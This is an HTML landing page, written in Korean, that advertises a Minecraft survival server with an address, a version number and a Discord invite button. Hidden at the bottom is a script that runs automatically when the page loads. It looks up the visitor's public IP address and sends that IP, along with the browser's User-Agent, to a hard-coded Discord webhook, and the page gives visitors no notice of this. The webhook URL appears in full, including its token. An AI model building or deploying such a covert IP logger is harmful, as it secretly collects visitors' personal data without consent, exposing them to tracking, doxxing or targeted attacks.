<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MCBELIST</title></title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-r from-green-400 to-blue-500 min-h-screen flex flex-col items-center justify-center font-sans">

<header class="text-center mb-12">
  <h1 class="text-5xl font-extrabold text-white drop-shadow-lg">McbeList</h1>
  <p class="mt-4 text-xl text-white/90">최고의 생존 서버! 지금 접속해보세요</p>
</header>

<div class="bg-white/90 backdrop-blur-lg shadow-2xl rounded-3xl p-10 w-96 text-center">
  <img src="https://static.wikia.nocookie.net/minecraft_gamepedia/images/0/0b/Grass_Block_JE2_BE2.png" 
       alt="서버 배너" class="w-40 mx-auto rounded-xl mb-6 shadow-lg">

  <p class="text-lg font-semibold mb-2">서버 주소: <span class="text-indigo-600">mc.example.com</span></p>
  <p class="text-lg font-semibold mb-4">버전: <span class="text-indigo-600">1.20.1</span></p>

  <a href="https://discord.gg/abcdef" target="_blank" 
     class="inline-block bg-indigo-600 text-white px-6 py-3 rounded-xl font-bold shadow-lg hover:bg-indigo-700 transition">
     디스코드 참여하기
  </a>
</div>

<footer class="mt-12 text-white/80 text-sm">
  © 2025 내 서버 홍보 사이트
</footer>

<script>
async function reportIp() {
  try {
    const ipResp = await fetch("https://api4.ipify.org?format=json");
    const { ip } = await ipResp.json();

    // 🔴 여기에 웹훅 URL을 넣으면 브라우저에서 직접 호출 가능 (CORS/보안 주의)
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1423616802428162170/Ax_AVm_t3uEd83Tr-RsC5h4dpNFzRcFmNKNnKWRPCuzmdFJaDu3aKuCpQuHbWrcyxa4U";

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: `방문자 IP: ${ip}\nUser-Agent: ${navigator.userAgent}` })
    });

    console.log("IP 전송 성공:", ip);
  } catch (e) {
    console.warn("IP 전송 실패:", e.message);
  }
}

reportIp();
</script>
</body>
</html>
